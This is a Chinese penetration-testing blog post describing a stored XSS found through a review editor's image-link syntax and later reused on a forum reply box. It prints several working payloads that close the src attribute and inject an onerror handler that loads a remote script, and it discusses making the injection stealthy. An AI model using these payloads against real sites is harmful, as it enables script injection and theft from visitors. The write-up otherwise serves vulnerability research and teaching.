#  漏洞挖掘 | 一处图片引用功能导致的XSS   
 迪哥讲事   2023-09-09 23:05  
  
# 山重水复疑无路  
  
漏洞点：站点产品评论处  
## 初步测试  
  
一开始尝试XSS，发现程序有过滤，提交均显示Tags are not permitted，最后测出来的是过滤 < ，不过滤 >  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicIW1aB1vXtklxc0fGibO41f7ZRHdBicnSxC2Wrxlr4lWOB2ia200GcUftubNUtWYc4mwGo53GurEdgA/640?wx_fmt=png "")  
  
因为提示速度比较快，猜测前端有一层检测。尝试绕过前端检测，burp拦截正常提交的内容，替换xss payload后发送，发现会自动跳转回首页，由此发现程序后端也有内容检测，这里直接xss暂时行不通。  
  
查看编辑器的其他功能：  
  
图片上传：可上传aspx（其他可能解析后缀均已尝试），不能解析并跳转至首页。可上传html并解析，这种方式构造的xss通常需要主动攻击，且攻击时易被管理员察觉到异常，暂不考虑。  
  
表情功能：没什么可利用的。  
# 柳暗花明又一村  
  
当看到编辑器提示的 img 外部图片引用方式时引起了我的注意，这里感觉可以操作一下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicIW1aB1vXtklxc0fGibO41fDeh6eaW7oOjuOlHlPMgZfbOeHcU8HUjgY2aGxBodQiaicyTnk5ZLDolg/640?wx_fmt=png "")  
## 正常测试  
  
先来看下正常引用方式时前端的显示，链接被带入到src中（logo前文字涉及域名，打码）：  
  
```
[img|XSSURL|xxxxx Logo]
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicIW1aB1vXtklxc0fGibO41fBBmMEyNrx4eCHXxoEeWRelY1l5KAMLhic084sEmQ4c0jfOajIH9Oh4Q/640?wx_fmt=png "")  
## 带入payload  
  
把xss payload 放在链接的位置再看一下：  
  
```
常规的payload：
<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='XSSURL';>
构造的payload：
[img|x onerror=s=createElement('script');body.appendChild(s);s.src='XSSURL';|xxxxx Logo]
```  
  
  
提交  
后审查元素发现为如下显示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicIW1aB1vXtklxc0fGibO41fVyMDWrfQOcbCtxFAq7LgnZ4alspL5ST9HFcPRaOm2viabvOCiciaAmibbQ/640?wx_fmt=png "")  
## 尝试闭合  
  
尝试闭合 x 处的双引号，让 onerror 逃逸出来：  
  
```
[img|x" onerror=s=createElement('script');body.appendChild(s);s.src='XSSURL';|hello]
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicIW1aB1vXtklxc0fGibO41f3uDh4YYlKC8GpJgsRwSvyiaE9QfPIWRnl8icUBGjOmlQwP5uH23NQLfg/640?wx_fmt=png "")  
  
  
这里提交后发现payload并没有执行成功，仔细看发现程序输出时分别在 onerror= 和 ; 后面加了双引号。  
## 闭合成功  
  
直接给个 > 让它闭合，虽然成功加载了，但是页面显示会有错误，这样十分容易被发现倪端，不够完美。  
  
```
[img|x" onerror=s=createElement('script');body.appendChild(s);s.src='XSSURL';>|hello]
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicIW1aB1vXtklxc0fGibO41fAA9vasKogvh7YFBnmecj9DiacYOGRS5WIGdlVBicJPibiagBgZCMqc9QEw/640?wx_fmt=png "")  
  
换个思路通过闭合掉 ; 后面的双引号，显示效果如下：  
  
  
```
[img|x" onerror=s=createElement('script');body.appendChild(s);s.src='XSSURL';"|hello]
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicIW1aB1vXtklxc0fGibO41fa9NjGaMTRsj1B6dvx1XgTQZqFOtoQu0UAj9McvXSjNvKicKB4l5QdSA/640?wx_fmt=png "")  
  
  
最终在没有任何错误内容显示的情况下成功执行了xss payload：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicIW1aB1vXtklxc0fGibO41fZVVWT1rFbpbYDOxUTEbQiajolkQA9nMs84wJlDwpZCbLC9iajjMHMnvQ/640?wx_fmt=png "")  
  
看到这里可能有人就会想，这种案例触发的xss是不是很少存在，因为毕竟不是每个编辑器都用这种图片外链引用方式，那么请继续看下面。  
# 灵活运用  
  
这几天在搞一个gangdu的论坛，在回复功能处，又遇到了同样的问题。  
  
本来这个功能应该只能放图片链接的，但是这里插入的链接格式和内容并没有做校验。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouicIW1aB1vXtklxc0fGibO41fKKhA5p9mOx88Sa6bVoVBfflTcUsb99rSj3SpQbBXsKNEARcDDGX38g/640?wx_fmt=jpeg "")  
  
```
x onerror=s=createElement('script');body.appendChild(s);s.src='XSSURL';
```  
  
  
这里直接把payload放进去，看下前端显示  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouicIW1aB1vXtklxc0fGibO41f2w8y2vQCoI3zHIGFGFgZcQuytkBgib17L98shtR0fd0SGlpRMq7iaIlQ/640?wx_fmt=jpeg "")  
  
同样的思路，这里直接闭合就好了  
  
```
x" onerror="s=createElement('script');body.appendChild(s);s.src='XSSURL';
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouicIW1aB1vXtklxc0fGibO41fwh5iaGEltWMerejXlQM4YNmB5zykwf39gBtHMibVAkjLQXr2T7IsGPug/640?wx_fmt=jpeg "")  
  
成功加载payload  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouicIW1aB1vXtklxc0fGibO41feqvT7ibZ6BkDzTPND3iaLAiaI9WXOR7a99nsrJwV1Ng36bxTdVWccJyxw/640?wx_fmt=jpeg "")  
  
  
平时渗透的时候，看到功能点不要上去就是蛮干，先预想下这个功能是大概怎么实现的，然后思路猥琐一点，心细一点，往往会有意想不到的收获的，就写到这里吧。  
  
如果你是一个长期主义者，欢迎加入我的知识星球([优先查看这个链接，里面可能还有优惠券](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247489122&idx=1&sn=a022eae85e06e46d769c60b2f608f2b8&chksm=e8a61c01dfd195170a090bce3e27dffdc123af1ca06d196aa1c7fe623a8957755f0cc67fe004&scene=21#wechat_redirect)  
)，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
## 往期回顾  
  
[2022年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[SSRF研究笔记](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486912&idx=1&sn=8704ce12dedf32923c6af49f1b139470&chksm=e8a607a3dfd18eb5abc302a40da024dbd6ada779267e31c20a0fe7bbc75a5947f19ba43db9c7&scene=21#wechat_redirect)  
  
  
[xss研究笔记](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487130&idx=1&sn=e20bb0ee083d058c74b5a806c8a581b3&chksm=e8a604f9dfd18defaeb9306b89226dd3a5b776ce4fc194a699a317b29a95efd2098f386d7adb&scene=21#wechat_redirect)  
  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
## 福利视频  
  
笔者自己录制的一套php视频教程(适合0基础的),感兴趣的童鞋可以看看,基础视频总共约200多集,目前已经录制完毕,后续还有更多视频出品  
  
https://space.bilibili.com/177546377/channel/seriesdetail?sid=2949374  
## 技术交流  
  
技术交流请加笔者微信:richardo1o1 (暗号:growing)  
  
